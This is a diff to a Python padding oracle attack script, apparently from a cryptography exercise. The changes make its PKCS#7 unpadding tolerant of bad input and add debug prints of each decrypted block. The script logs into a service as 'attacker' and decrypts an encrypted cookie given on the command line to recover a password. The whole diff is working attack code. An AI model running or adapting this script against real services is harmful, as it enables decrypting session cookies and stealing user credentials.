@@ -25,14 +25,30 @@ class PaddingOracleAttack:
             return False
         return True
 
+    # def remove_pkcs7_padding(self, data):
+    #     padding_len = data[-1]
+    #     print("Padding length:", padding_len)
+    #     if padding_len < 1 or padding_len > self.block_length:
+    #         raise ValueError("Invalid PKCS#7 padding.")
+    #     for byte in data[-padding_len:]:
+    #         if byte != padding_len:
+    #             raise ValueError("Invalid PKCS#7 padding.")
+    #     return data[:-padding_len]
     def remove_pkcs7_padding(self, data):
-        padding_len = data[-1]
-        if padding_len < 1 or padding_len > self.block_length:
-            raise ValueError("Invalid PKCS#7 padding.")
-        for byte in data[-padding_len:]:
-            if byte != padding_len:
-                raise ValueError("Invalid PKCS#7 padding.")
-        return data[:-padding_len]
+        try:
+            padding_len = data[-1]
+            print("Padding length:", padding_len)
+            if padding_len < 1 or padding_len > self.block_length:
+                print("Warning: Invalid PKCS#7 padding length detected.")
+                return data  # You might choose to return the data as is or handle differently
+            for byte in data[-padding_len:]:
+                if byte != padding_len:
+                    print("Warning: Invalid PKCS#7 padding detected.")
+                    return data  # Again, returning data as is or handle it as needed
+            return data[:-padding_len]
+        except Exception as e:
+            print(f"Error during PKCS#7 padding removal: {e}")
+            return data  # Depending on your needs, you might want to handle this case differently
 
     def po_attack(self, encrypted_cookie):
         encrypted_cookie_bytes = bytes.fromhex(encrypted_cookie)
@@ -42,6 +58,7 @@ class PaddingOracleAttack:
 
         for i in range(len(blocks) - 1):
             decrypted_block = self.po_attack_2blocks(blocks[i], blocks[i+1])
+            print("Decrypted block", i, ":", decrypted_block)
             decrypted_message += decrypted_block
 
         return self.remove_pkcs7_padding(decrypted_message)
@@ -71,6 +88,6 @@ if __name__ == "__main__":
     if attacker.do_login_form("attacker", "attacker"):
         encrypted_cookie = os.sys.argv[1]
         decrypted_password = attacker.po_attack(encrypted_cookie)
-        print("Decrypted password:", decrypted_password.decode('utf-8'))
+        print("Decrypted password:", decrypted_password.decode('utf-8', errors='replace'))
     else:
         print("Login failed.")
